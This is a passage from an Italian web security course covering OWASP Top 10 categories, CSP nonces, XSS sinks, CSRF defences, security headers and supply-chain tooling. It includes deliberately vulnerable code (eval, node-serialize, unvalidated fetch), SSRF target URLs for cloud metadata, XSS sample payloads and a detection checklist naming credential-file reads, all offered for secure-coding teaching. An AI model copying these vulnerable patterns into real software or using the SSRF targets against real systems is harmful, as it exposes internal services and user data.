L'injection scende dalla prima alla terza posizione grazie all'adozione diffusa di ORM e query parametrizzate nei framework moderni. Tuttavia rimane una minaccia critica, specialmente per codice legacy e raw query. Oltre alla SQL Injection trattata nella sezione precedente, questa categoria include XSS (ora incluso in A03), NoSQL injection, OS command injection, LDAP injection e Expression Language injection.

**Principio universale:** separare sempre i dati dalla logica di controllo. In ogni interprete — SQL, shell, LDAP, template engine — i dati dell'utente non devono mai essere interpretati come istruzioni.

### A04 — Insecure Design

L'Insecure Design è una categoria nuova introdotta nel 2021 che rappresenta difetti architetturali fondamentali, non risolvibili con un'implementazione perfetta. A differenza di un bug nel codice, un design insicuro non può essere corretto con un patch — richiede una riprogettazione.

```javascript
// DESIGN INSICURO — password reset tramite domande di sicurezza
// Le risposte alle domande di sicurezza sono spesso ricavabili dai social media
app.post('/reset-password', async (req, res) => {
  const { email, mothersMaidenName, petName } = req.body;
  // ...
});

// DESIGN SICURO — password reset tramite token monouso via email
app.post('/forgot-password', async (req, res) => {
  const { email } = req.body;
  const token = crypto.randomBytes(32).toString('hex');
  const expiry = new Date(Date.now() + 30 * 60 * 1000); // 30 minuti

  await db.query(
    'INSERT INTO password_resets (email, token_hash, expires_at) VALUES ($1, $2, $3)',
    [email, await argon2.hash(token), expiry]
  );

  await sendEmail(email, `https://example.com/reset?token=${token}`);

  // Risposta generica — non rivelare se l'email esiste
  res.json({ message: 'Se l\'email esiste, riceverai le istruzioni.' });
});
```

**Pratiche per un design sicuro:** threat modeling durante la progettazione, user story con abuse case ("Come attaccante, posso..."), limite massimo di transazioni per utente/sessione, segregazione dei dati per tenant in applicazioni multi-tenant.

### A05 — Security Misconfiguration

La misconfiguration include permessi cloud troppo permissivi, funzionalità non necessarie abilitate, account di default non rimossi, stack trace esposti in produzione e header di sicurezza mancanti.

```javascript
// MISCONFIGURED — stack trace in produzione
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,        // MAI in produzione
    query: err.query,        // espone query SQL
    path: __dirname          // espone path del filesystem
  });
});

// CORRETTO — error handler differenziato per ambiente
app.use((err, req, res, next) => {
  logger.error({ err, url: req.originalUrl, method: req.method });

  const isProduction = process.env.NODE_ENV === 'production';
  res.status(err.statusCode || 500).json({
    error: isProduction ? 'Errore interno del server' : err.message,
    ...(isProduction ? {} : { stack: err.stack })
  });
});
```

### A06 — Vulnerable and Outdated Components

L'uso di librerie con vulnerabilità note è tra i vettori di attacco più sfruttati. La sezione "Dependency Security" di questo modulo tratta i tool di audit. Un aspetto critico è il concetto di **transitive dependency**: una dipendenza diretta del progetto può a sua volta dipendere da decine di pacchetti, ognuno con potenziali vulnerabilità.

```bash
# Visualizzare l'albero completo delle dipendenze
npm ls --all --depth=10

# Verificare quali pacchetti dipendono da un pacchetto specifico
npm ls lodash

# Verificare le versioni effettivamente installate vs. quelle dichiarate
npm outdated
```

### A07 — Identification and Authentication Failures

Questa categoria copre i fallimenti nell'identificazione e autenticazione, trattati nella sezione "Broken Authentication". I pattern critici includono: sessioni che non scadono, ID di sessione prevedibili, trasmissione di credenziali su canali non cifrati, password deboli accettate senza vincoli, assenza di MFA per operazioni sensibili.

### A08 — Software and Data Integrity Failures

Si verifica quando il codice o l'infrastruttura non proteggono da violazioni dell'integrità. Include pipeline CI/CD non protette, aggiornamenti automatici senza verifica di firma, deserializzazione di dati non fidati.

```javascript
// VULNERABILE — deserializzazione di JSON arbitrario con eval
const config = eval('(' + userInput + ')');

// VULNERABILE — node-serialize con funzioni
const serialize = require('node-serialize');
const obj = serialize.unserialize(userControlledString); // RCE possibile

// SICURO — parsing rigoroso con JSON.parse (non esegue codice)
try {
  const config = JSON.parse(userInput);
  const validated = configSchema.validate(config);
} catch (e) {
  return res.status(400).json({ error: 'Formato non valido' });
}
```

### A09 — Security Logging and Monitoring Failures

Senza logging adeguato, gli attacchi passano inosservati. La mediana del tempo di rilevamento di un breach è di oltre 200 giorni (fonte: IBM Cost of a Data Breach Report). Ogni applicazione deve registrare: tentativi di autenticazione falliti, fallimenti di autorizzazione, errori di validazione input, eccezioni non gestite, modifiche a dati sensibili.

```javascript
// Struttura di log di sicurezza raccomandata
const securityLog = {
  timestamp: new Date().toISOString(),
  level: 'WARN',
  category: 'AUTH',
  event: 'LOGIN_FAILED',
  actor: { ip: req.ip, userAgent: req.headers['user-agent'] },
  target: { username: req.body.username },
  outcome: 'FAILURE',
  reason: 'INVALID_PASSWORD',
  requestId: req.headers['x-request-id']
};

// Correlazione degli eventi con request ID
app.use((req, res, next) => {
  req.requestId = req.headers['x-request-id'] || crypto.randomUUID();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});
```

### A10 — Server-Side Request Forgery (SSRF)

L'SSRF è stata aggiunta alla lista OWASP Top 10 2021 direttamente dal sondaggio della community (votata al primo posto). Si verifica quando l'applicazione effettua richieste HTTP verso URL forniti dall'utente senza validazione, permettendo all'attaccante di raggiungere servizi interni, metadati cloud e reti private.

```javascript
// VULNERABILE — l'utente controlla l'URL di destinazione
app.post('/api/fetch-url', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url); // SSRF: può raggiungere servizi interni
  res.json(await response.json());
});

// Attacchi SSRF comuni:
// - http://169.254.169.254/latest/meta-data/ → metadati EC2 (AWS)
// - http://metadata.google.internal/ → metadati GCP
// - http://127.0.0.1:6379/ → Redis locale
// - http://10.0.0.1:8080/admin → pannello admin interno
// - http://[::1]:22/ → SSH locale via IPv6

// SICURO — validazione URL con allowlist e verifica DNS
import { URL } from 'url';
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];

// Range IP interni da bloccare
const BLOCKED_RANGES = [
  '127.0.0.0/8',      // loopback
  '10.0.0.0/8',       // RFC 1918 classe A
  '172.16.0.0/12',    // RFC 1918 classe B
  '192.168.0.0/16',   // RFC 1918 classe C
  '169.254.0.0/16',   // link-local (include metadati cloud)
  '0.0.0.0/8',        // indirizzi non specificati
  'fc00::/7',         // IPv6 unique local
  '::1/128',          // IPv6 loopback
  'fe80::/10'         // IPv6 link-local
];

async function validateUrl(inputUrl) {
  let parsed;
  try {
    parsed = new URL(inputUrl);
  } catch {
    throw new AppError('URL non valido', 400);
  }

  // Consentire solo HTTP/HTTPS
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new AppError('Protocollo non consentito', 400);
  }

  // Bloccare porte non standard (opzionale)
  const port = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
  if (!['80', '443'].includes(port)) {
    throw new AppError('Porta non consentita', 400);
  }

  // Allowlist di hostname
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
    throw new AppError('Host non consentito', 400);
  }

  // Risolvere DNS e verificare che l'IP non sia interno
  const addresses = await dns.resolve4(parsed.hostname);
  for (const addr of addresses) {
    const ip = ipaddr.parse(addr);
    for (const range of BLOCKED_RANGES) {
      if (ip.match(ipaddr.parseCIDR(range))) {
        throw new AppError('Destinazione non consentita', 400);
      }
    }
  }

  return parsed.href;
}

app.post('/api/fetch-url', authenticate, async (req, res) => {
  const safeUrl = await validateUrl(req.body.url);
  const response = await fetch(safeUrl, {
    signal: AbortSignal.timeout(5000),  // timeout di 5 secondi
    redirect: 'error'                    // non seguire redirect (possono bypassare la validazione)
  });
  res.json(await response.json());
});
```

**Difesa in profondità contro SSRF:** segmentazione di rete (i servizi che effettuano fetch esterni devono essere isolati dai servizi interni), metadata endpoint disabilitati o protetti (IMDSv2 su AWS richiede un token), firewall di uscita (egress filtering) che blocchi traffico verso range interni.

---

## CSP Avanzata — Nonce, strict-dynamic e Reporting

La sezione "Security Headers" ha introdotto la Content Security Policy. Questa sezione approfondisce le tecniche avanzate per configurare una CSP efficace e mantenibile in applicazioni moderne.

### Strategia Nonce-Based

Il nonce (number used once) è un valore casuale generato per ogni richiesta HTTP. Solo gli script che includono il nonce corretto nel tag vengono eseguiti, rendendo impossibile l'esecuzione di script iniettati da un attaccante.

```javascript
import crypto from 'crypto';

// Middleware per generare nonce per-request
app.use((req, res, next) => {
  // 128 bit di entropia minima (16 byte → 24 char base64)
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Applicazione del nonce nella CSP
app.use((req, res, next) => {
  const nonce = res.locals.cspNonce;
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    "style-src 'self' 'unsafe-inline'",
    "object-src 'none'",
    "base-uri 'self'"
  ].join('; '));
  next();
});
```

```html
<!-- Nel template HTML — solo gli script con il nonce vengono eseguiti -->
<script nonce="<%- cspNonce %>">
  // Questo script viene eseguito perché ha il nonce corretto
  console.log('Script autorizzato');
</script>

<!-- Uno script iniettato da un attaccante NON ha il nonce -->
<script>alert('XSS')</script>  <!-- BLOCCATO dalla CSP -->
```

### La direttiva strict-dynamic

La direttiva `'strict-dynamic'` estende la fiducia conferita dal nonce agli script caricati dinamicamente dal codice autorizzato. Quando un script con nonce valido crea un nuovo elemento `<script>` e lo inserisce nel DOM, lo script figlio viene automaticamente autorizzato.

```javascript
// Con 'strict-dynamic' nella CSP:
// script-src 'nonce-abc123' 'strict-dynamic'

// Lo script principale (con nonce) può caricare dinamicamente altri script
const analyticsScript = document.createElement('script');
analyticsScript.src = 'https://analytics.example.com/tracker.js';
document.head.appendChild(analyticsScript);
// → Questo script viene eseguito grazie a strict-dynamic

// IMPORTANTE: con strict-dynamic, le allowlist di host vengono ignorate.
// Solo nonce/hash e i loro script figli sono autorizzati.
// Questo semplifica enormemente la policy perché non serve elencare ogni CDN.
```

**Vantaggi di strict-dynamic:** elimina la necessità di mantenere allowlist di host per gli script (i CDN possono cambiare dominio), supporta pattern di caricamento moderni (code splitting, dynamic import), compatibile con la maggior parte dei bundler (webpack, Vite, esbuild), riduce drasticamente la complessità della CSP in applicazioni con molte dipendenze di terze parti.

### CSP Reporting

La CSP offre un meccanismo di reporting che consente di ricevere notifiche quando una violazione viene rilevata. Questo è fondamentale sia in fase di deploy iniziale (modalità report-only) sia in produzione per rilevare tentativi di attacco.

```javascript
// Header CSP con reporting
// Report-Only: la policy non viene enforced, solo segnalata
res.setHeader('Content-Security-Policy-Report-Only', [
  "default-src 'self'",
  `script-src 'nonce-${nonce}' 'strict-dynamic'`,
  "report-uri /csp-violation-report",
  "report-to csp-endpoint"
].join('; '));

// Header Report-To (API Reporting moderna, sostituisce report-uri)
res.setHeader('Report-To', JSON.stringify({
  group: 'csp-endpoint',
  max_age: 86400,
  endpoints: [{ url: '/csp-violation-report' }]
}));

// Endpoint per ricevere i report di violazione
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'] || req.body;

  logger.warn({
    type: 'csp_violation',
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
    timestamp: new Date().toISOString()
  });

  res.status(204).end();
});
```

**Strategia di deploy progressivo:** (1) deploy con `Content-Security-Policy-Report-Only` e policy restrittiva; (2) raccolta report per 1-2 settimane in produzione; (3) analisi dei report per identificare risorse legittime bloccate; (4) aggiustamento della policy per includere le risorse necessarie; (5) passaggio a `Content-Security-Policy` (enforcement); (6) mantenimento di `report-uri` per monitoraggio continuo.

### require-trusted-types-for

La direttiva `require-trusted-types-for 'script'` attiva l'enforcement dei Trusted Types, una API del browser che previene il DOM-based XSS intercettando ogni assegnazione a injection sink pericolosi.

```javascript
// CSP con Trusted Types enforcement
res.setHeader('Content-Security-Policy', [
  `script-src 'nonce-${nonce}' 'strict-dynamic'`,
  "require-trusted-types-for 'script'",
  "trusted-types myapp-policy dompurify"
].join('; '));
```

---

## XSS Prevention — Approfondimento e Trusted Types

Oltre alle tecniche base di prevenzione XSS (output encoding, CSP, DOMPurify), questa sezione approfondisce le strategie avanzate per ogni variante di XSS e introduce l'API Trusted Types.

### DOM-Based XSS — Sorgenti e Sink

Il DOM-Based XSS è particolarmente insidioso perché il payload malevolo non transita mai attraverso il server. L'attacco avviene interamente nel browser, sfruttando il flusso dai **source** (sorgenti di dati controllate dall'attaccante) ai **sink** (API del browser che eseguono codice).

**Sorgenti pericolose (sources):**

| Source | Esempio |
|--------|---------|
| `location.hash` | `#<script>alert(1)</script>` |
| `location.search` | `?q=<img onerror=...>` |
| `document.referrer` | Referrer controllato dall'attaccante |
| `window.name` | Impostabile da pagine cross-origin |
| `postMessage` | Messaggi da iframe malevoli |
| `localStorage` / `sessionStorage` | Dati precedentemente inquinati |
| `document.cookie` | Cookie settati da sottodomini malevoli |

**Sink pericolosi (dove i dati diventano codice):**

| Sink | Rischio |
|------|---------|
| `element.innerHTML` | Parsing e esecuzione di HTML |
| `element.outerHTML` | Come innerHTML |
| `document.write()` | Inserimento nel flusso del parser HTML |
| `eval()` | Esecuzione diretta di codice JavaScript |
| `setTimeout(string)` | Esecuzione di codice come eval |
| `setInterval(string)` | Come setTimeout |
| `new Function(string)` | Creazione ed esecuzione di funzione |
| `element.setAttribute('onclick', ...)` | Creazione di event handler |
| `location.href = ...` | Navigazione a URL javascript: |

```javascript
// Pattern sicuri per evitare DOM-Based XSS

// VULNERABILE: innerHTML con dati utente
element.innerHTML = `<span>${userInput}</span>`;

// SICURO: textContent — non interpreta HTML
element.textContent = userInput;

// SICURO: createElement + textContent
const span = document.createElement('span');
span.textContent = userInput;
element.appendChild(span);

// SICURO: template letterali con tag function per sanitizzazione
function safeHtml(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = i < values.length ? escapeHtml(values[i]) : '';
    return result + str + value;
  }, '');
}
element.innerHTML = safeHtml`<span>${userInput}</span>`;
```

### Trusted Types API

L'API Trusted Types è un meccanismo del browser che previene il DOM-Based XSS intercettando ogni assegnazione a un injection sink. Quando i Trusted Types sono abilitati, il browser rifiuta le stringhe raw passate ai sink e richiede oggetti di tipo `TrustedHTML`, `TrustedScript` o `TrustedScriptURL`, creati attraverso policy definite dallo sviluppatore.

```javascript
// Definizione di una policy Trusted Types
if (window.trustedTypes && trustedTypes.createPolicy) {
  const myPolicy = trustedTypes.createPolicy('myapp-policy', {
    // Questa funzione trasforma stringhe in TrustedHTML
    createHTML: (input) => {
      return DOMPurify.sanitize(input, {
        RETURN_TRUSTED_TYPE: true
      });
    },

    // Questa funzione trasforma stringhe in TrustedScriptURL
    createScriptURL: (input) => {
      const url = new URL(input, window.location.origin);
      if (url.origin === window.location.origin) {
        return input; // solo script same-origin
      }
      throw new TypeError(`URL non consentito: ${input}`);
    },

    // Questa funzione trasforma stringhe in TrustedScript
    createScript: (input) => {
      // In generale, non consentire la creazione di script da stringhe
      throw new TypeError('Creazione di script da stringhe non consentita');
    }
  });

  // Uso della policy
  element.innerHTML = myPolicy.createHTML(userInput); // OK — sanitizzato
  element.innerHTML = userInput; // ERRORE — il browser blocca la stringa raw
}
```

**Supporto browser (al 2026):** Chrome 83+, Edge 83+, Opera 69+, Samsung Internet 13.0+. Firefox supporta Trusted Types a partire dalla versione 138 (flag abilitato). Safari ha un'implementazione parziale. Per i browser che non supportano Trusted Types, la direttiva CSP viene semplicemente ignorata, fornendo un fallback sicuro basato sulle altre protezioni CSP.

### Prevenzione XSS nei framework moderni

I framework moderni (React, Angular, Vue, Svelte) eseguono l'escape automatico dell'output per default, ma ogni framework ha pattern specifici che bypassano questa protezione.

```javascript
// REACT — pattern pericolosi da evitare
// 1. dangerouslySetInnerHTML senza sanitizzazione
<div dangerouslySetInnerHTML={{ __html: userInput }} /> // VULNERABILE

// 2. href con protocollo javascript:
<a href={userInput}>Link</a>  // VULNERABILE se userInput = "javascript:..."

// 3. Attributi data- con valori non encodati passati a script
<div data-config={JSON.stringify(userInput)} />

// ANGULAR — vulnerabilità specifiche
// 1. bypassSecurityTrustHtml senza sanitizzazione preventiva
this.sanitizer.bypassSecurityTrustHtml(userInput); // VULNERABILE

// VUE — vulnerabilità specifiche
// 1. v-html senza sanitizzazione
// <div v-html="userInput"></div>  // VULNERABILE

// 2. Template compilation a runtime con dati utente
new Vue({ template: userInput });  // VULNERABILE — RCE possibile
```

---

## CSRF Avanzato — SameSite, Double Submit e Fetch Metadata

Oltre ai pattern base (token CSRF e SameSite cookie) trattati in precedenza, questa sezione approfondisce le difese moderne contro il CSRF.

### SameSite Cookie — Analisi dettagliata

L'attributo `SameSite` dei cookie è diventato la difesa primaria contro il CSRF nei browser moderni. A partire dal 2020, la maggior parte dei browser imposta `SameSite=Lax` come valore predefinito per i cookie che non specificano l'attributo esplicitamente.

| Valore | Comportamento | Caso d'uso |
|--------|--------------|------------|
| `Strict` | Il cookie non viene mai inviato in richieste cross-site, nemmeno cliccando un link | Sessioni ad alta sicurezza (banking, admin panel) |
| `Lax` | Il cookie viene inviato solo con navigazioni top-level GET (click su link), ma non con POST, iframe o fetch cross-site | Sessioni utente generali (default consigliato) |
| `None` | Il cookie viene sempre inviato (richiede `Secure`) | OAuth, widget embedded, integrazioni cross-site |

```javascript
// Scenario: perché SameSite=Strict può causare problemi UX
// Se un utente clicca un link a example.com da un'email,
// con Strict il cookie di sessione NON viene inviato → l'utente appare non autenticato

// Soluzione: doppio cookie
res.cookie('__session', sessionId, {
  sameSite: 'lax',      // inviato per link da email/bookmark
  httpOnly: true,
  secure: true
});

res.cookie('__session_strict', sessionId, {
  sameSite: 'strict',   // usato per operazioni sensibili
  httpOnly: true,
  secure: true
});

// Middleware: operazioni di lettura richiedono il cookie Lax
// Operazioni di scrittura richiedono il cookie Strict
function csrfProtection(req, res, next) {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    if (!req.cookies['__session_strict']) {
      return res.status(403).json({ error: 'Sessione non valida per questa operazione' });
    }
  }
  next();
}
```

### Origin Header Validation

Il browser include automaticamente l'header `Origin` nelle richieste POST cross-origin. Validare questo header è una difesa aggiuntiva contro il CSRF che non richiede token.

```javascript
// Middleware di validazione Origin
function validateOrigin(req, res, next) {
  // Solo per richieste di modifica
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const origin = req.headers['origin'];
  const referer = req.headers['referer'];

  // Determinare l'origine della richiesta
  const requestOrigin = origin || (referer ? new URL(referer).origin : null);

  if (!requestOrigin) {
    // Richiesta senza Origin/Referer — potrebbe essere legittima
    // (es. richiesta da bookmarklet, redirect 302)
    // Decidere la policy: bloccare o consentire con log
    logger.warn('Richiesta senza Origin/Referer', { path: req.path, ip: req.ip });
    return res.status(403).json({ error: 'Origine della richiesta non verificabile' });
  }

  const allowedOrigins = new Set([
    'https://example.com',
    'https://www.example.com'
  ]);

  if (!allowedOrigins.has(requestOrigin)) {
    logger.warn('Origin non consentito', { origin: requestOrigin, path: req.path });
    return res.status(403).json({ error: 'Origine non consentita' });
  }

  next();
}
```

### Fetch Metadata Headers (Sec-Fetch-*)

I browser moderni inviano header `Sec-Fetch-*` che indicano il contesto della richiesta. Questi header non possono essere impostati da JavaScript e forniscono informazioni affidabili sull'intento della richiesta.

```javascript
// Middleware basato su Fetch Metadata
function fetchMetadataProtection(req, res, next) {
  const secFetchSite = req.headers['sec-fetch-site'];
  const secFetchMode = req.headers['sec-fetch-mode'];
  const secFetchDest = req.headers['sec-fetch-dest'];

  // Se il browser non invia Sec-Fetch-* (browser molto vecchio), consentire
  if (!secFetchSite) return next();

  // Richieste same-origin → sempre consentite
  if (secFetchSite === 'same-origin') return next();

  // Richieste same-site (sottodomini) → consentire con cautela
  if (secFetchSite === 'same-site') return next();

  // Navigazione top-level da cross-origin (click su link) → consentire solo GET
  if (secFetchMode === 'navigate' && req.method === 'GET') return next();

  // Tutte le altre richieste cross-origin → bloccare
  logger.warn('Richiesta cross-origin bloccata da Fetch Metadata', {
    site: secFetchSite,
    mode: secFetchMode,
    dest: secFetchDest,
    path: req.path
  });

  return res.status(403).json({ error: 'Richiesta cross-origin non consentita' });
}

// sec-fetch-site: same-origin | same-site | cross-site | none
// sec-fetch-mode: navigate | cors | no-cors | same-origin | websocket
// sec-fetch-dest: document | script | style | image | font | empty | ...
```

---

## Security Headers — Guida Completa

La sezione precedente ha introdotto la configurazione con Helmet. Questa sezione approfondisce ogni header di sicurezza e le configurazioni avanzate per scenari complessi.

### HSTS (HTTP Strict Transport Security) — Dettagli

L'HSTS istruisce il browser a comunicare esclusivamente via HTTPS con il dominio, eliminando la possibilità di un downgrade attack sulla prima connessione HTTP. Il browser converte automaticamente ogni richiesta HTTP in HTTPS prima di inviarla.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

| Parametro | Significato |
|-----------|-------------|
| `max-age` | Durata in secondi per cui il browser ricorderà la policy (63072000 = 2 anni) |
| `includeSubDomains` | La policy si applica anche a tutti i sottodomini |
| `preload` | Dichiara l'intenzione di essere incluso nella HSTS Preload List dei browser |

**Rischi dell'HSTS:** una volta abilitato con `includeSubDomains`, ogni sottodominio DEVE avere un certificato TLS valido. Un sottodominio senza certificato diventerà inaccessibile. Iniziare con un `max-age` breve (es. 300 secondi) e aumentare progressivamente dopo aver verificato che tutti i sottodomini funzionino correttamente via HTTPS.

### X-Frame-Options e frame-ancestors

Proteggono dal clickjacking, un attacco in cui una pagina malevola include il sito target in un iframe invisibile sovrapposto a elementi cliccabili.

```
# X-Frame-Options (legacy, supportato universalmente)
X-Frame-Options: DENY                    # mai in iframe
X-Frame-Options: SAMEORIGIN              # solo iframe same-origin

# CSP frame-ancestors (moderno, più flessibile)
Content-Security-Policy: frame-ancestors 'none'                # come DENY
Content-Security-Policy: frame-ancestors 'self'                # come SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' https://partner.com  # selettivo
```

Impostare entrambi per compatibilità con browser datati, ma `frame-ancestors` nella CSP ha la precedenza nei browser moderni.

### Permissions-Policy

La Permissions-Policy (precedentemente Feature-Policy) controlla quali API del browser possono essere utilizzate dalla pagina e dai suoi iframe. Questo limita la superficie di attacco impedendo a script malevoli iniettati di accedere a sensori, fotocamera, microfono e altre API potenzialmente invasive.

```
Permissions-Policy:
  camera=(),
  microphone=(),
  geolocation=(self),
  payment=(self),
  usb=(),
  bluetooth=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=(),
  display-capture=(),
  autoplay=(self),
  fullscreen=(self),
  picture-in-picture=(self),
  web-share=(self)
```

La sintassi `()` disabilita completamente la funzionalità. `(self)` la limita al dominio corrente. `(self "https://partner.com")` la consente anche per un partner specifico.

### CORP, COOP, COEP — Cross-Origin Isolation

Questi tre header lavorano insieme per abilitare il cross-origin isolation, una modalità del browser che protegge contro attacchi side-channel come Spectre.

```
# Cross-Origin-Resource-Policy (CORP)
# Controlla chi può caricare le risorse del server
Cross-Origin-Resource-Policy: same-origin     # solo pagine same-origin
Cross-Origin-Resource-Policy: same-site        # stesso sito (inclusi sottodomini)
Cross-Origin-Resource-Policy: cross-origin     # qualsiasi origine (come le immagini pubbliche)

# Cross-Origin-Opener-Policy (COOP)
# Isola la finestra del browser dalle finestre cross-origin
Cross-Origin-Opener-Policy: same-origin        # isola completamente
Cross-Origin-Opener-Policy: same-origin-allow-popups  # consente popup

# Cross-Origin-Embedder-Policy (COEP)
# Richiede che tutte le risorse cross-origin usino CORS o CORP
Cross-Origin-Embedder-Policy: require-corp     # tutte le risorse devono avere CORP
Cross-Origin-Embedder-Policy: credentialless   # carica senza credenziali (alternativa meno restrittiva)
```

```javascript
// Quando COOP: same-origin + COEP: require-corp sono entrambi attivi,
// il browser abilita il cross-origin isolation.
// Questo è necessario per usare SharedArrayBuffer e timer ad alta precisione.

// Verifica nel browser:
if (crossOriginIsolated) {
  // SharedArrayBuffer è disponibile
  const sab = new SharedArrayBuffer(1024);
}

// ATTENZIONE: COEP: require-corp richiede che OGNI risorsa cross-origin
// (immagini, font, script da CDN) abbia l'header CORP: cross-origin
// oppure sia servita con header CORS appropriati.
// Usare 'credentialless' come alternativa meno invasiva.
```

---

## Supply Chain Security

Le dipendenze di terze parti rappresentano una delle superfici di attacco più critiche nelle applicazioni moderne. Un'applicazione Node.js media include centinaia di pacchetti transitivi, ognuno potenzialmente compromesso. Gli attacchi supply chain nel 2025 hanno raggiunto una scala senza precedenti, con compromissioni di pacchetti scaricati miliardi di volte alla settimana.

### Subresource Integrity (SRI)

SRI consente di verificare che le risorse caricate da CDN o origini esterne non siano state manomesse. Il browser calcola l'hash della risorsa scaricata e lo confronta con l'hash dichiarato nell'attributo `integrity`. Se non corrispondono, la risorsa viene bloccata.

```html
<!-- Script con SRI — il browser verifica l'hash prima dell'esecuzione -->
<script
  src="https://cdn.example.com/lib/lodash@4.17.21/lodash.min.js"
  integrity="sha384-abc123def456..."
  crossorigin="anonymous">
</script>

<!-- Stylesheet con SRI -->
<link
  rel="stylesheet"
  href="https://cdn.example.com/css/normalize.css"
  integrity="sha384-xyz789..."
  crossorigin="anonymous">
```

```bash
# Generare l'hash SRI per un file
openssl dgst -sha384 -binary file.js | openssl base64 -A
# Output: sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC

# Con shasum
cat file.js | shasum -b -a 384 | awk '{ print $1 }' | xxd -r -p | base64
```

```javascript
// Generazione automatica di tag SRI nel build system
import crypto from 'crypto';
import fs from 'fs';

function generateSRI(filePath, algorithm = 'sha384') {
  const content = fs.readFileSync(filePath);
  const hash = crypto.createHash(algorithm).update(content).digest('base64');
  return `${algorithm}-${hash}`;
}

// Esempio: generare tag per tutti gli asset CDN
const integrity = generateSRI('./dist/vendor.js');
// → sha384-oqVuAfXRKap7fdgcCY5uykM6+...
```

**Requisiti SRI:** l'attributo `crossorigin="anonymous"` è obbligatorio per risorse cross-origin (altrimenti il browser non verifica l'integrità). L'algoritmo raccomandato è `sha384` (buon compromesso tra sicurezza e lunghezza). È possibile specificare più hash con algoritmi diversi come fallback: `integrity="sha384-... sha512-..."`.

### Lockfile Integrity e Audit delle Firme

Il lockfile garantisce la riproducibilità delle installazioni. Senza lockfile, `npm install` potrebbe risolvere versioni diverse in momenti diversi, introducendo silenziosamente codice non verificato.

```bash
# In CI/CD — SEMPRE usare npm ci (non npm install)
# npm ci:
# - Installa ESATTAMENTE le versioni nel lockfile
# - Cancella node_modules prima dell'installazione
# - Non modifica mai package-lock.json
# - Fallisce se il lockfile non è sincronizzato con package.json
npm ci

# Verificare le firme dei pacchetti npm (registry signatures)
npm audit signatures
# Verifica che i pacchetti installati siano firmati dal registro npm
# e che le firme corrispondano al contenuto

# Ignorare i lifecycle scripts (preinstall, postinstall)
# I lifecycle scripts sono il vettore principale per attacchi supply chain
npm ci --ignore-scripts

# Dopo --ignore-scripts, eseguire manualmente solo gli script necessari
npx node-gyp rebuild  # se servono moduli nativi
```

```javascript
// .npmrc — configurazione di sicurezza raccomandata
// ignore-scripts=true       ← previene l'esecuzione automatica di script
// audit=true                ← audit automatico ad ogni installazione
// engine-strict=true        ← rifiuta pacchetti incompatibili con la versione Node
// package-lock=true         ← forza la creazione/aggiornamento del lockfile
// save-exact=true           ← salva versioni esatte (non range) in package.json
```

### Socket.dev — Analisi Comportamentale

A differenza degli scanner CVE tradizionali (npm audit, Snyk), Socket analizza il comportamento di ogni pacchetto pubblicato sul registro npm. Rileva anomalie come: un pacchetto che improvvisamente accede al filesystem, apre connessioni di rete, legge variabili d'ambiente, esegue comandi di sistema o accede a credenziali.

```bash
# Installazione dell'app Socket per GitHub
# → socket.dev — integrazione CI che blocca PR con dipendenze sospette

# Analisi locale
npx socket report create .

# Verifiche di Socket:
# - Nuovo maintainer su un pacchetto popolare (account takeover?)
# - Pacchetto con nome simile a uno popolare (typosquatting)
# - Versione che aggiunge network calls non presenti prima
# - Codice offuscato in postinstall script
# - Accesso a ~/.aws/credentials o ~/.ssh/
```

### npm audit vs. Snyk vs. Socket — Confronto

| Strumento | Approccio | Copertura | Quando usare |
|-----------|-----------|-----------|--------------|
| `npm audit` | Database CVE del registro npm | Vulnerabilità note con CVE | Sempre, come baseline minima in CI |
| Snyk | CVE + ricerca proprietaria + fix automatici | Vulnerabilità note + suggerimenti di upgrade | Progetti con necessità di remediation guidata |
| Socket | Analisi comportamentale statica | Anomalie, supply chain, typosquatting | Rilevamento proattivo di attacchi 0-day |

Queste tre categorie sono complementari, non alternative. Una pipeline CI/CD robusta dovrebbe includere almeno `npm audit` e un tool di analisi comportamentale.

---

## Secrets Management nel Frontend

Il codice frontend viene eseguito nel browser dell'utente, dove tutto il codice sorgente, le variabili e le chiamate di rete sono visibili. Nessun segreto è veramente sicuro nel frontend.

### Regola fondamentale

**Mai includere segreti nel codice frontend.** Questo include: API key con permessi di scrittura, credenziali di database, secret per firmare JWT, chiavi di cifratura, token OAuth client secret. Tutti i bundler (webpack, Vite, esbuild) producono codice in chiaro ispezionabile — le variabili d'ambiente incluse nel bundle con `VITE_`, `NEXT_PUBLIC_` o `REACT_APP_` sono visibili a chiunque.

```javascript
// VULNERABILE — API key nel codice frontend
const STRIPE_SECRET_KEY = 'sk_live_abc123';  // ESPOSTO nel bundle
const response = await fetch('https://api.stripe.com/v1/charges', {
  headers: { 'Authorization': `Bearer ${STRIPE_SECRET_KEY}` }
});

// SICURO — proxy attraverso il proprio backend
// Il segreto rimane sul server, mai esposto al client
// Frontend:
const response = await fetch('/api/create-charge', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000, currency: 'eur' })
});

// Backend (server-side):
app.post('/api/create-charge', authenticate, async (req, res) => {
  const stripe = new Stripe(process.env.STRIPE_SECRET_KEY); // segreto solo sul server
  const charge = await stripe.charges.create(req.body);
  res.json({ id: charge.id });
});
```

### API Key Pubbliche vs. Segrete

